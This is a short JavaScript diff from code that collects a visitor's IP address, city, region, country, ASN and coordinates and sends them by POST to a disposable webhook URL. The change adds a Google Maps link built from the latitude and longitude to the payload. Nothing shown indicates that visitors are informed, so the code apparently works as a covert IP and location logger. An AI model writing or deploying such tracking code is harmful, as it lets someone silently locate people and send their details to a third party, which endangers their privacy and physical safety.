@@ -58,21 +58,26 @@
           asn
         } = data;
 
+        const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+        const payload = {
+          ip: ipAddress,
+          city,
+          region: stateProv,
+          country: countryName,
+          asn,
+          latitude,
+          longitude,
+          map_link: googleMapsLink
+        };
+
         await fetch("https://webhook-test.com/26eff05a1fb9bd13e113d9a93d51f174", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            ip: ipAddress,
-            city,
-            region: stateProv,
-            country: countryName,
-            latitude,
-            longitude,
-            asn
-          })
+          body: JSON.stringify(payload)
         });
-      } catch (e) {
-        console.error("Failed to log IP:", e);
+      } catch (err) {
+        console.error("Failed to fetch/log IP:", err);
       }
     }
 
